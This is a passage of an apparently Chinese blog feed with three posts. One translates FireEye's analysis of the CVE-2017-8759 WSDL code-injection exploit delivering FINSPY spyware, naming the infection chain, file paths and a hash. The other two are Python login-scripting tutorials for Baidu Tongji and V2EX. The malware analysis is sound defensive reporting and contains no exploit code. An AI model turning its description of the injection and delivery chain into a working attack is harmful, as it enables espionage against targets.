<p>在CVE-2017-8759利用成功之后，该文档会下载多个组件（后面有详情），最终会加载一个FINSPY payload（MD5：a7b990d5f57b244dd17e9a937a41e7f5）。</p>
<p>FINSPY恶意软件，也叫做FinFisher或者WingBird，是可以购买的用于“合法窃听”的软件。基于这个和之前FINSPY的使用，我们有更多的信心说这个恶意文档是一个针对俄语目标的网络间谍活动。</p>
<p>根据FireEye动态威胁情报系统的更多的检测，根据不同client的行为关联，发现该样本在2017年7月就已经出现了。</p>
<h1 id="CVE-2017-8759-WSDL-解析器代码注入"><a href="#CVE-2017-8759-WSDL-解析器代码注入" class="headerlink" title="CVE-2017-8759 WSDL 解析器代码注入"></a>CVE-2017-8759 WSDL 解析器代码注入</h1><p>代码注入漏洞是存在于WSDL解析模块的PrintClientProxy方法中（<a href="http://referencesource.microsoft.com/" target="_blank" rel="noopener">http://referencesource.microsoft.com/</a> - System.Runtime.Remoting/metadata/wsdlparser.cs,6111）。</p>
<p>IsValidUrl没有对提供的包含CRLF序列（换行回车）的数据进行正确的校验，这就允许了攻击者注入和执行任意代码。部分漏洞代码如图1所示。</p>
<p><img src="/img/fireeye-CVE-2017-8759-1.png" alt="图1. WSDL解析器的漏洞"></p>
<p>当在SOAP响应中多个address被定义时，代码会在第一个地址后插入“//base.ConfigureProxy(this.GetType(),”字符串，注释了后面剩余的address。然而，如果恶意的address的还有一个CRLF，后面的代码就不会被注释。</p>
<p>图2展示了对CRLF缺乏验证，System.Diagnostics.Process.Start方法会被注入。生成的代码会被.NET框架的csc.exe编译，然后作为DLL加载到Office可执行程序中。</p>
<p><img src="/img/fireeye-CVE-2017-8759-2.png" alt="图2. SOAP定义和产生的代码"> </p>
<h1 id="在外散播的攻击"><a href="#在外散播的攻击" class="headerlink" title="在外散播的攻击"></a>在外散播的攻击</h1><p>FireEye检测到在外散播的攻击使用的是富文本(RTF)格式的文档，和我们之前报告的CVE-2017-0199文档类似。</p>
<p>该恶意样本包含一个是利用更方便的嵌入的SOAP Moniker，如图3所示。</p>
<p><img src="/img/fireeye-CVE-2017-8759-3.png" alt="图3. SOAP Moniker"> </p>
<p>样本从一个攻击者控制的服务器接收恶意的SOAP WSDL定义的数据。.NET框架中System.Runtime.Remoting.ni.dll中实现的WSDL解析器会解析内容然后生成一个.cs源代码到工作目录中。</p>
<p>接着.NET框架的csc.exe编译该代码生成一个名字像http[url path].dll的库文件。然后微软的Office会加载这个库，完成漏洞利用。图4展示了漏洞利用加载的示例库文件。</p>
<p><img src="/img/fireeye-CVE-2017-8759-4.png" alt="图4. 被加载的DLL">  </p>
<p>在成功的利用中，注入的代码会创建一个新的进程，利用mshta.exe会从同一个服务器接收一个叫做“word.db”的HTA脚本。</p>
<p>HTA脚本会从磁盘删除源代码，编译的DLL和PDB文件，然后下载执行叫做“left.jpg”的FINSPY恶意软件，虽然它是.jpg后缀名，类型是image/jpeg，但其实是个可执行文件。</p>
<p>图5展示了恶意软件传输的PCAP细节。</p>
<p><img src="/img/fireeye-CVE-2017-8759-5.png" alt="图5. 实时的请求"> </p>
<p>该恶意软件会被放在%appdata%\Microsoft\Windows\OfficeUpdte-KB[ 6 random numbers ].exe中。图6展示了在Process Monitor中的进程创建链。</p>
<p><img src="/img/fireeye-CVE-2017-8759-6.png" alt="图6. 进程创建链"> </p>
<h1 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a>恶意软件</h1><p>Left.jpg (md5: a7b990d5f57b244dd17e9a937a41e7f5)是FINSPY的变体。它利用高强度的混淆代码开发了一个内置虚拟机以及其他的一些反分析技术，来增加逆向的难度。比如另个月单独的反分析技术是，它会解析自己的全路径，然后搜索是否存在他自己的MD5哈希字符串。很多分析工具和沙箱为了能保证准确的唯一文件名会重命名样本文件为MD5哈希。该样本会使用WininetStartupMutex0的mutex来保证单实例。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CVE-2017-8759是2017年FireEye发现的第二个分发FINSPY的0day。这个揭露说明签名资源对“合法窃听”的公司和他们用户都是可用的。此外，FINSPY买了多个不同的客户端，漏洞可以用于攻击其他的目标。</p>
<p>CVE-2017-8759可能已经被更多的攻击者利用了。尽管我们没有证据，但是在2017年7月分析中，CVE-2017-0199已经被金融攻击者用来分发FINSPY。如果FINSPY的攻击者有之前使用的相同源码的漏洞，那么可能代码已经被卖给了更多的攻击者。</p>
<h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>感谢Dhanesh Kizhakkinan, Joseph Reyes, FireEye Labs Team, FireEye FLARE Team and FireEye iSIGHT Intelligence发布这个博客。同样感谢MSRC协助解决这个问题的工作人员。</p>
<p>参考：<a href="http://blog.sina.com.cn/s/blog_67ae918d0102e1l9.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_67ae918d0102e1l9.html</a></p>
<p>文章来源：<br><a href="https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html" target="_blank" rel="noopener">https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html</a></p>
<p>转载请注明：<a href="http://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/">http://anhkgg.github.io/tans-fireeye-cve-2017-8759-finspy-0day/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2017.9.12 | by Genwei Jiang, Ben Read, Tom Bennett | Threat Research&lt;/p&gt;
&lt;p&gt;FIreEye近期检测到一个恶意的利用CVE-2017-8759漏洞的微软Office RTF文档。&lt;/p&gt;
&lt;p&gt;CVE-2017-8759是SOAP WSDL分析器代码注入漏洞，在解析SOAP WSDL定义的内容中它允许攻击者注入任意代码。&lt;/p&gt;
&lt;p&gt;FireEye分析了这个攻击者使用的微软Word文档，它利用任意代码注入来下载和执行一个包含PowerShell命令的VB脚本。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>
    
    
      <category term="FireEye" scheme="https://anhkgg.github.io/tags/FireEye/"/>
    
      <category term="cve20178759" scheme="https://anhkgg.github.io/tags/cve20178759/"/>
    
      <category term="FINSPY" scheme="https://anhkgg.github.io/tags/FINSPY/"/>
    
  </entry>
  
  <entry>
    <title>pylogin系列之搞定百度统计</title>
    <link href="https://anhkgg.github.io/pylogin-baidutongji-login-analyze/"/>
    <id>https://anhkgg.github.io/pylogin-baidutongji-login-analyze/</id>
    <published>2017-08-21T16:01:25.000Z</published>
    <updated>2017-08-22T05:31:17.910Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这次分析的百度统计登录接口，算是这几个中最简单的了。</p>
<p>但是学到了一个新东西，叫做js模板，搞web的同学应该知道，我这种web半吊子第一次见，非常有意思。</p>
<a id="more"></a>
<p>工具：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. chrome/firefox</span><br><span class="line">2. f12，network</span><br><span class="line">3. python：requests、re</span><br></pre></td></tr></table></figure>
<h1 id="登录接口"><a href="#登录接口" class="headerlink" title="登录接口"></a>登录接口</h1><p>打开百度统计首页<code>https://tongji.baidu.com/web/welcome/login</code>，点开登录框，f12。尝试输入之后，查看发送的数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Request URL:https://cas.baidu.com/?action=login</span><br><span class="line">Request Method:POST</span><br><span class="line">Status Code:200 OK</span><br><span class="line"></span><br><span class="line">appscope[]:6</span><br><span class="line">appscope[]:7</span><br><span class="line">appscope[]:12</span><br><span class="line">appid:12</span><br><span class="line">entered_login:anhkgg //名字</span><br><span class="line">entered_password:1111111111111111 //密码</span><br><span class="line">entered_imagecode:9mxm //验证码</span><br><span class="line">charset:utf-8</span><br><span class="line">fromu:https://tongji.baidu.com/web/welcome/loginback</span><br><span class="line">selfu:https://tongji.baidu.com/web/welcome/login</span><br><span class="line">senderr:1</span><br></pre></td></tr></table></figure>
<p>除了上面注释的需要输入的三个字段，其他字段意义都不明确，偷点懒，多次尝试后发现其他字段不会变化，那么就用固定值了。</p>
<p>点击验证码，看到网络，拿到获取验证码的请求，key使用10位时间戳。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https://cas.baidu.com/?action=image&amp;key=1503151305</span><br></pre></td></tr></table></figure>
<p>所以登录接口就出来了，<code>vcode</code>需要人工输入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">url = &apos;https://cas.baidu.com/?action=image&amp;key=&apos; + time_stamp(10)</span><br><span class="line">r = self.s.get(url)</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &apos;appscope[]&apos;:6,</span><br><span class="line">    &apos;appscope[]&apos;:7,</span><br><span class="line">    &apos;appscope[]&apos;:12,</span><br><span class="line">    &apos;appid&apos;:12,</span><br><span class="line">    &apos;entered_login&apos;:name,</span><br><span class="line">    &apos;entered_password&apos;:pwd,</span><br><span class="line">    &apos;entered_imagecode&apos;:vcode,</span><br><span class="line">    &apos;charset&apos;:&apos;utf-8&apos;,</span><br><span class="line">    &apos;fromu&apos;:&apos;https://tongji.baidu.com/web/welcome/loginback&apos;,</span><br><span class="line">    &apos;selfu&apos;:&apos;https://tongji.baidu.com/web/welcome/login&apos;,</span><br><span class="line">    &apos;senderr&apos;:1,</span><br><span class="line">    &#125;        </span><br><span class="line">url = &apos;https://cas.baidu.com/?action=login&apos;</span><br><span class="line">r = self.s.post(url, data = payload)</span><br></pre></td></tr></table></figure>
<p>接着看看登录返回状态，如果失败了，返回数据中包含如下数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;ReFresh&quot; content=&quot;0; url=https://tongji.baidu.com/web/welcome/login?fromu=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback&amp;e=%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF&amp;un=anhkgg&amp;aid=12&amp;errno=132&quot; /&gt;</span><br><span class="line">&lt;title&gt;正在处理...&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;                </span><br><span class="line">    var url=&quot;https://tongji.baidu.com/web/welcome/login?fromu=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback&amp;e=%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF&amp;un=anhkgg&amp;aid=12&amp;errno=132&quot;;</span><br><span class="line">    location.href=url;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>然后浏览器加载该url，显示错误提示信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Request URL:https://tongji.baidu.com/web/welcome/login?fromu=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback&amp;e=%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E9%94%99%E8%AF%AF&amp;un=anhkgg&amp;aid=12&amp;errno=132</span><br><span class="line">Request Method:GET</span><br><span class="line"></span><br><span class="line">fromu:https://tongji.baidu.com/web/welcome/loginback</span><br><span class="line">e:用户名密码错误</span><br><span class="line">un:anhkgg</span><br><span class="line">aid:12</span><br><span class="line">errno:132</span><br></pre></td></tr></table></figure>
<p>其中<code>e</code>是错误提示信息，errno是错误号。</p>
<p>登录成功返回数据如下，没有<code>e</code>错误信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;                </span><br><span class="line">var url=&quot;http://cas.baidu.com/?action=check&amp;appid=12&amp;u=https%3A%2F%2Ftongji.baidu.com%2Fweb%2Fwelcome%2Floginback%3Fcastk%3Dc4086gh7e82166251d451&amp;fromLogin=1&quot;;</span><br><span class="line">location.href=url;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>那么就可以先通过正则拿到url，通过搜索url是否有<code>e</code>判断是否登录成功，并且拿到提示信息。成功则继续访问该url跳转到成功页面，获取其他需要的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(r&apos;var url=&quot;(.*?)&quot;;&apos;)</span><br><span class="line">cont = re.search(pattern, r.content)</span><br><span class="line">url = cont.group(1)</span><br><span class="line">pattern = re.compile(r&apos;e=(.*?)&amp;un=&apos;)</span><br><span class="line">cont = re.search(pattern, url)</span><br><span class="line">if cont != None:</span><br><span class="line">    r = urllib.unquote(cont.group(1)) #失败</span><br><span class="line">    return utf2gbk(r)        </span><br><span class="line"></span><br><span class="line">r = self.s.get(url) # 成功</span><br></pre></td></tr></table></figure>
<h1 id="js模板"><a href="#js模板" class="headerlink" title="js模板"></a>js模板</h1><p>这里比较意思的是使用的js模板来生成登录表单。</p>
<p>具体js模板使用看<a href="http://freshflower.iteye.com/blog/2120268" target="_blank" rel="noopener">这里</a>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;script id=&quot;LoginTemplate&quot; type=&quot;text/template&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id=&quot;LoginContainer&quot; class=&quot;login-dialog&quot;&gt;</span><br><span class="line">        &lt;div id=&quot;TopTmp&quot;&gt;&amp;nbsp;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        if (this.isIco == 1) &#123;</span><br><span class="line">        &lt;div id=&quot;LoginMain&quot; class=&quot;ico-login clearfix&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;visitor-login-tab&quot; id=&quot;LoginTab&quot;&gt;请输入查看密码&lt;/div&gt;</span><br><span class="line">            &lt;div id=&quot;LoginInput&quot; class=&quot;login-input&quot;&gt;</span><br><span class="line">                if (this.errMsg) &#123;</span><br><span class="line">                &lt;div id=&quot;ErrorTip&quot; class=&quot;error&quot;&gt;#&#123;this.errMsg&#125;&lt;/div&gt;</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">        &lt;div id=&quot;LoginMain&quot; class=&quot;login-main&quot;&gt;</span><br><span class="line">            </span><br><span class="line">                &lt;form method=&quot;post&quot; action=&quot;#&#123;this.loginAction&#125;&quot;&gt;</span><br><span class="line">                    &lt;input type=&quot;hidden&quot; value=&quot;12&quot; id=&quot;Appid&quot; name=&quot;appid&quot;&gt;</span><br><span class="line">                    ...</span><br><span class="line">                    &lt;input type=&quot;hidden&quot; value=&quot;#&#123;this.selfUrl&#125;&quot; name=&quot;selfu&quot; /&gt;</span><br><span class="line">                    &lt;input type=&quot;hidden&quot; value=&quot;1&quot; name=&quot;senderr&quot; /&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;dialog-bottom-bg&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>从上面代码中可以看到，某些标签的值使用了<code>#{this.xxx}</code>这样的语法，不是直接填入的具体内容，更加灵活，扩展更容易。</p>
<p>然后在点击登录按钮之后，通过函数格式化一个全局定义的变量来生成的登录表单。具体如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//全局数据，用于替换表单中的this.xxx</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">VAR = &#123;</span><br><span class="line">    webMasterRegister: &quot;https://tongji.baidu.com/web/register&quot;,</span><br><span class="line">    customRegister: &quot;https://u.baidu.com/ucweb/?module=Reguser&amp;controller=reg&amp;action=index&amp;appid=3&quot;,</span><br><span class="line">    union_forget: &quot;http://union.baidu.com/findPassword!input.action&quot;,</span><br><span class="line">    shifen_forget: &quot;https://aq.baidu.com/new/#/findpwd&quot;,</span><br><span class="line">    uc_forget: &quot;https://aq.baidu.com/new/#/findpwd&quot;,</span><br><span class="line">    waiting_img_src: &quot;/web/img/loadingImage.gif&quot;,</span><br><span class="line">    app_id: &quot;0&quot;,</span><br><span class="line">    errMsg: &quot;&quot;,</span><br><span class="line">    loginUrl: &quot;/web/welcome/login&quot;,</span><br><span class="line">    loginAction: &quot;https://cas.baidu.com/?action=login&quot;,</span><br><span class="line">    userName: &quot;&quot;,</span><br><span class="line">    authCode: &quot;https://cas.baidu.com/?action=image&amp;key=1503151305&quot;,</span><br><span class="line">    registerUrl: &quot;/web/register&quot;,</span><br><span class="line">    fromUrl: &quot;https://tongji.baidu.com/web/welcome/loginback&quot;,</span><br><span class="line">    selfUrl: &quot;https://tongji.baidu.com/web/welcome/login&quot;,</span><br><span class="line">    isIco: &quot;0&quot;,</span><br><span class="line">    webmasterUserNum: &quot;2097176&quot;,</span><br><span class="line">    customerUserNum: &quot;2270927&quot;,</span><br><span class="line">    mtjUserNum: &quot;2262130&quot;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>然后在login.js中，通过下面的函数来初始化表单，并且显示。</p>
<p>其中<code>n.format(&quot;LoginTemplate&quot;, VAR)</code>用于格式化VAR定义的数据到表单的数据中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">, h = function() &#123;</span><br><span class="line">    var e = t(&quot;.login-trigger&quot;).eq(0);</span><br><span class="line">    e.on(&quot;click&quot;, function() &#123;</span><br><span class="line">        s || (s = new i(&#123;</span><br><span class="line">            width: 345,</span><br><span class="line">            isModal: !0,</span><br><span class="line">            titleText: &quot;&quot;,</span><br><span class="line">            isSingle: !0,</span><br><span class="line">            content: n.format(&quot;LoginTemplate&quot;, VAR) //初始化登录表单数据</span><br><span class="line">        &#125;),</span><br><span class="line">        loginController.init()),</span><br><span class="line">        s.show()</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<p>而在format具体如何替换的，就随意实现了，这里就不在具体分析，有兴趣跟着分析的同学可以去看看common.js中的代码。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>百度统计接口非常简单，密码未做变换，使用https。</p>
<p>登录之后具体做什么也不在分析。</p>
<p>预告下次做百度主站的登录分析，简单看了下，非常…复杂！</p>
<p>安利一下公众号：汉客儿</p>
<p><img src="/img/wechat_public.png" alt="img"></p>
<p>转载请注明出处，博客原文：<a href="https://anhkgg.github.io/pylogin-baidutongji-login-analyze/">https://anhkgg.github.io/pylogin-baidutongji-login-analyze/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;这次分析的百度统计登录接口，算是这几个中最简单的了。&lt;/p&gt;
&lt;p&gt;但是学到了一个新东西，叫做js模板，搞web的同学应该知道，我这种web半吊子第一次见，非常有意思。&lt;/p&gt;
    
    </summary>
    
      <category term="crawler" scheme="https://anhkgg.github.io/categories/crawler/"/>
    
    
      <category term="crawler" scheme="https://anhkgg.github.io/tags/crawler/"/>
    
      <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>
    
      <category term="js" scheme="https://anhkgg.github.io/tags/js/"/>
    
      <category term="javascript" scheme="https://anhkgg.github.io/tags/javascript/"/>
    
      <category term="v2ex" scheme="https://anhkgg.github.io/tags/v2ex/"/>
    
      <category term="自动领币" scheme="https://anhkgg.github.io/tags/%E8%87%AA%E5%8A%A8%E9%A2%86%E5%B8%81/"/>
    
  </entry>
  
  <entry>
    <title>pylogin系列之V2EX自动领币消息提醒</title>
    <link href="https://anhkgg.github.io/pylogin-v2ex-login-analyze/"/>
    <id>https://anhkgg.github.io/pylogin-v2ex-login-analyze/</id>
    <published>2017-08-18T13:09:58.000Z</published>
    <updated>2017-08-22T05:31:40.082Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>最近开始混v2ex，v2ex发主题、回复都要收钱，发帖收钱还跟字数相关，之前不知道这些，发个帖子内容太多，kao，没钱了！</p>
<p>虽然主题有人回复会收到钱，但是也没人回复啊，也不知道v2ex大佬们喜欢什么内容！</p>
<p>幸好v2ex有个登录领币任务，每天还可以攒点钱，但是有些时候会忘啊，怎么办？…</p>
<p>嗯，程序员嘛，偷懒的办法多…这就开始分析接口，自动领币！</p>
<a id="more"></a>
<p>然后呢，发个主题，总想看看有没有大佬关注和回复，然后就时不时打开浏览器，去刷新一下页面。</p>
<p>就跟大部分用windows的人一样，回到桌面不右键+E（刷新）一下，就感觉人生好像少了什么东西（我好像是重症患者，用ubuntu也要找一下刷新桌面）！</p>
<p>这种情况是不是病啊？！</p>
<p>然后呢，刷新很浪费时间诶，有人回复，看着还算开心嘛，但也没人回复，那不白浪费时间了嘛，还影响期待的小心情！</p>
<p>所以呢，还得加上自动消息提醒功能！</p>
<p>废话完毕，开始干活！</p>
<p>工具：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. chrome/firefox</span><br><span class="line">2. f12，network</span><br><span class="line">3. python：requests、re</span><br></pre></td></tr></table></figure>
<h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><p>开始分析登录接口。打开chrome，f12，进入登录页面。只需要输入名字和密码，没有验证码，真好！</p>
<p>访问的链接是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.v2ex.com/signin</span><br></pre></td></tr></table></figure>
<p>然后随便输入什么名字和密码，点击登录，肯定失败，页面有提示。再看网络请求数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST https://www.v2ex.com/signin</span><br><span class="line">Host: www.v2ex.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">//发送数据</span><br><span class="line">6b79e5fdb638c190396648c486c313dca73ad9f6e4e122fafc356e54522eedc4:&quot;111111111111111&quot; //name</span><br><span class="line">bb4419eb55aef4106a853ce9f4642d5d58ac021f4e1fef29a230e2352da74802:&quot;11111111111&quot; //password</span><br><span class="line">once:&quot;95083&quot;</span><br><span class="line">next:&quot;/&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//登录错误</span><br><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;&lt;a href=&quot;/&quot;&gt;V2EX&lt;/a&gt; &lt;span class=&quot;chevron&quot;&gt;&amp;nbsp;›&amp;nbsp;&lt;/span&gt; 登录 &amp;nbsp;&lt;li class=&quot;fa fa-lock&quot;&gt;&lt;/li&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;problem&quot;&gt;请解决以下问题然后再提交：&lt;ul&gt;&lt;li&gt;用户名和密码无法匹配&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>这个请求关键点:</p>
<ol>
<li>POST请求，url是<code>https://www.v2ex.com/signin</code></li>
<li>发送数据有名字和明文密码，以及两个其他不明字段</li>
<li>请求是https，所以明文密码不会暴露。</li>
</ol>
<p>在仔细看发送的4个数据。<br>名字和密码对应的字段都是一长串字符，猜想这个是变化的，每次刷新登录页面都不一样，多次尝试下确认该猜想！</p>
<p>如何获取呢，肯定是在打开登录页面时就会收到服务器返回的这两个字符串的。在登录html内容中一翻，看到如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;&lt;a href=&quot;/&quot;&gt;V2EX&lt;/a&gt; &lt;span class=&quot;chevron&quot;&gt;&amp;nbsp;›&amp;nbsp;&lt;/span&gt; 登录 &amp;nbsp;&lt;li class=&quot;fa fa-lock&quot;&gt;&lt;/li&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;cell&quot;&gt;</span><br><span class="line">        &lt;form method=&quot;post&quot; action=&quot;/signin&quot;&gt;</span><br><span class="line">        &lt;table cellpadding=&quot;5&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; width=&quot;100%&quot;&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td 